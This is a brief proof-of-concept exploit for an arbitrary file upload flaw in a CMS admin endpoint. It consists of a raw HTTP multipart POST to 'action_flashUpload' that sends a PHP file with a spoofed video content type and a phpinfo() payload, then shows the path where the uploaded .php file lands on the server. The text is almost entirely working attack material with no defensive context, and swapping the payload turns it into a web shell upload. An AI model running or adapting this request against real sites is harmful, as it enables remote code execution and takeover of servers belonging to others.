```
POC:
POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload
HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----aaa
------aaa
Content-Disposition: form-data; name="filePath"; filename="test.php"
Content-Type: video/x-flv
<?php phpinfo();?>
------aaa
/cms/upload/images/2023/08/11/1691722887xXbx.php
```

